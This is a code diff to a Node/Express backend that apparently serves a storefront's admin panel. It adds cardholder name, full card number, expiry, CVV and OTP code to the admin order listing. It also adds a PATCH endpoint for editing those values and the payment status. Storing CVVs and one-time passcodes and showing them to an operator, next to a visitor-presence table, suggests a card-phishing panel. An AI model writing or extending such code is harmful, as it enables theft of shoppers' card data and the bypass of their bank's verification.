@@ -1,7 +1,7 @@
 import { Router } from "express";
 import { asc, eq } from "drizzle-orm";
 import { db, ordersTable, productsTable, presenceTable, siteContentTable } from "@workspace/db";
-import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody } from "@workspace/api-zod";
+import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
 
 const router = Router();
@@ -22,11 +22,50 @@ router.get("/admin/orders", async (_req, res, next) => {
         paymentStatus: ordersTable.paymentStatus,
         status: ordersTable.status,
         createdAt: ordersTable.createdAt,
+        cardName: ordersTable.cardName,
+        cardNumber: ordersTable.cardNumber,
+        cardExpiry: ordersTable.cardExpiry,
+        cardCvv: ordersTable.cardCvv,
+        otpCode: ordersTable.otpCode,
       })
       .from(ordersTable)
       .orderBy(asc(ordersTable.createdAt));
 
     res.json(orders);
+  } catch (error) {
+    next(error);
+  }
+});
+
+router.patch("/admin/orders/:id", async (req, res, next) => {
+  try {
+    const id = Number(req.params.id);
+    if (Number.isNaN(id)) {
+      return res.status(400).json({ error: "Invalid order id" });
+    }
+
+    const body = UpdateOrderBody.parse(req.body);
+    const updateValues: Record<string, unknown> = {};
+
+    if (body.cardName !== undefined) updateValues.cardName = body.cardName;
+    if (body.cardNumber !== undefined) updateValues.cardNumber = body.cardNumber;
+    if (body.cardExpiry !== undefined) updateValues.cardExpiry = body.cardExpiry;
+    if (body.cardCvv !== undefined) updateValues.cardCvv = body.cardCvv;
+    if (body.otpCode !== undefined) updateValues.otpCode = body.otpCode;
+    if (body.paymentStatus !== undefined) updateValues.paymentStatus = body.paymentStatus;
+    if (body.status !== undefined) updateValues.status = body.status;
+
+    const updated = await db
+      .update(ordersTable)
+      .set(updateValues)
+      .where(eq(ordersTable.id, id))
+      .returning();
+
+    if (updated.length === 0) {
+      return res.status(404).json({ error: "Order not found" });
+    }
+
+    res.json(updated[0]);
   } catch (error) {
     next(error);
   }
